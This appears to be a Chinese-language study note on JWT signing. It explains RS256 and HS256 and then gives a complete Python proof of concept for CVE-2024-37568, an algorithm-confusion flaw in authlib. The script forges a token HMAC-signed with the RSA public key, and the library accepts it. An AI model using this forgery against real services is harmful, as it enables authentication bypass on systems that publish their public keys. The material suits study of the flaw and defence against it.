#### RS256和HS256算法的JWT

**RS256**

```txt
# kid是选择的公钥
{"alg":"RS256","typ":"JWT","kid":"key-id-1"} 
```

jwt生成：

* 用户（通常是认证服务器）拥有 **私钥**
* 构造 JWT 的 `header` 和 `payload`。
* 对 `header.payload` 做 SHA-256 摘要。
* 用 **私钥** 对摘要进行签名 → 得到 `signature`。`RSASSA-PKCS1-v1_5(private_key, hash)`
* 拼接成完整 JWT：

jwt验证：

* 接收者（通常是资源服务器）拿到 JWT。
* 拆分 header、payload、signature。
* 用同样方法计算 `header.payload` 的 SHA-256 摘要。
* 使用 **公钥** 验证签名：
  * 如果签名合法 → payload 没被篡改，来源可信。
  * 如果签名不合法 → 拒绝 JWT。

风险：

* 可以指定验证的公钥
* 私钥泄露
* 算法混淆

**SH256**

`expected_signature = HMAC_SHA256(secret, header + "." + payload)`

#### CVE-2024-37568

```python
from authlib.jose import jwt
from Crypto.PublicKey import RSA
from Crypto.Hash import HMAC, SHA256
import base64

# ----- KEY PAIR CREATION -----

# Generate an RSA key pair to simulate a typical cryptographic setup
# The private key should ideally remain secret and is used for signing data
private_key = RSA.generate(2048)

# Public key that is distributed or exposed in some way
# In certain scenarios, this key can be derived from signatures
public_key = private_key.publickey().export_key(format='PEM')

# Ensure the setup is functioning as expected
private_pem = private_key.export_key(format='PEM')
generated_token = jwt.encode({"alg": "RS256"}, {"secure": False}, private_pem)
decoded_claims = jwt.decode(generated_token, public_key)
assert not decoded_claims["secure"]

# ----- MALICIOUS TOKEN GENERATION -----

# Simulating an attack where a valid token is created without needing the private key
# This should not be possible in a secure JWT implementation
# Helper function to encode data in URL-safe Base64 format
encode_base64 = lambda data: base64.urlsafe_b64encode(data).rstrip(b'=')

# Build the token header and payload, tricking the system into using HS256 instead of RS256
header = encode_base64(b'{"alg":"HS256"}')
payload = encode_base64(b'{"secure":true}')
unsigned_token = header + b'.' + payload

# Create a fake signature using the public key, exploiting the algorithm confusion
hmac_signature = HMAC.new(public_key, digestmod=SHA256)
hmac_signature.update(unsigned_token)
signature = encode_base64(hmac_signature.digest())

# The manipulated token that should be rejected by the server but won't be
# forged_token是伪造的签名
forged_token = unsigned_token + b'.' + signature
print("FORGED TOKEN:", forged_token)

# ----- SERVER TOKEN HANDLING -----

# The server tries to validate the incoming token, but due to the algorithm flaw, it gets tricked
# The verification process incorrectly accepts the manipulated token
verified_data = jwt.decode(forged_token, public_key)

if verified_data["secure"]:
    print("EXPLOIT SUCCESSFUL")
```

* 利用前提服务器要公开RS256的**公钥**
* 由于公钥只做验证，无法生成签名，因此在OpenID Connect、OAuth2 等体系中，认证服务器通常会公开公钥供给各个微服务或者第三方应用验证JWT是否合法